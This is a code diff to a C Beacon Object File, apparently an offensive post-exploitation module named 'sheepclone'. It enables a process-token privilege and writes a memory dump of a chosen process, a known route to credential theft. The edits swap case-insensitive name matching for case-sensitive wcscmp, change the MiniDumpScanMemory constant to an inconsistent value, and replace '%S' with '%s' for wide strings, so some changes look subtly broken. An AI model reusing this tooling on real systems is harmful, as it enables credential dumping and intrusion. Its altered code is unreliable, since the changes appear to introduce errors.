@@ -25,6 +25,9 @@ DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESS
 DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
 DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetProcessId(HANDLE);
+DECLSPEC_IMPORT void* WINAPI MSVCRT$malloc(size_t);
+DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
+DECLSPEC_IMPORT int WINAPI MSVCRT$wcscmp(const wchar_t*, const wchar_t*);
 
 // Define STATUS_SUCCESS if not already defined
 #ifndef STATUS_SUCCESS
@@ -98,7 +101,7 @@ typedef enum _MINIDUMP_TYPE {
     MiniDumpWithFullMemory = 0x00000002,
     MiniDumpWithHandleData = 0x00000004,
     MiniDumpFilterMemory = 0x00000008,
-    MiniDumpScanMemory = 0x00000010,
+    MiniDumpScanMemory = 0x00001000,
     MiniDumpWithUnloadedModules = 0x00000020,
     MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
     MiniDumpFilterModulePaths = 0x00000080,
@@ -161,10 +164,10 @@ BOOL IsPrivilegeEnabled(LPCWSTR privilegeName) {
         WCHAR name[256];
         DWORD nameSize = sizeof(name) / sizeof(WCHAR);
         if (ADVAPI32$LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameSize)) {
-            if (_wcsicmp(name, privilegeName) == 0) {
+            if (MSVCRT$wcscmp(name, privilegeName) == 0) {
                 found = TRUE;
                 if (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "Privilege '%S' is already enabled (Attributes: 0x%lx)", privilegeName, privileges->Privileges[i].Attributes);
+                    BeaconPrintf(CALLBACK_OUTPUT, "Privilege '%s' is already enabled (Attributes: 0x%lx)", privilegeName, privileges->Privileges[i].Attributes);
                     MSVCRT$free(privileges);
                     KERNEL32$CloseHandle(tokenHandle);
                     return TRUE;
@@ -177,7 +180,7 @@ BOOL IsPrivilegeEnabled(LPCWSTR privilegeName) {
     MSVCRT$free(privileges);
     KERNEL32$CloseHandle(tokenHandle);
     if (!found) {
-        BeaconPrintf(CALLBACK_ERROR, "Privilege '%S' not found in process token", privilegeName);
+        BeaconPrintf(CALLBACK_ERROR, "Privilege '%s' not found in process token", privilegeName);
         return FALSE;
     }
     return FALSE;
@@ -191,7 +194,7 @@ BOOL EnablePrivilege() {
     LUID luid;
 
     if (IsPrivilegeEnabled(privilegeName)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "No need to enable '%S'; it is already enabled", privilegeName);
+        BeaconPrintf(CALLBACK_OUTPUT, "No need to enable '%s'; it is already enabled", privilegeName);
         return TRUE;
     }
 
@@ -202,7 +205,7 @@ BOOL EnablePrivilege() {
     BeaconPrintf(CALLBACK_OUTPUT, "Got Token handle: %p", tokenHandle);
 
     if (!ADVAPI32$LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
-        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueW Failed for '%S'! Error: %lu", privilegeName, KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueW Failed for '%s'! Error: %lu", privilegeName, KERNEL32$GetLastError());
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
@@ -225,7 +228,7 @@ BOOL EnablePrivilege() {
     }
 
     KERNEL32$CloseHandle(tokenHandle);
-    BeaconPrintf(CALLBACK_OUTPUT, "Successfully enabled '%S'", privilegeName);
+    BeaconPrintf(CALLBACK_OUTPUT, "Successfully enabled '%s'", privilegeName);
     return TRUE;
 }
 
@@ -370,7 +373,7 @@ void go(char* args, int length) {
 
     // Validate arguments
     if (!processToClonePid || !dumpPath) {
-        BeaconPrintf(CALLBACK_ERROR, "Usage: sheepclone <PID> <PATH_TO_DUMP>");
+        BeaconPrintf(CALLBACK_ERROR, "Usage: sheepclone <PID> <DUMP_PATH>");
         return;
     }
 
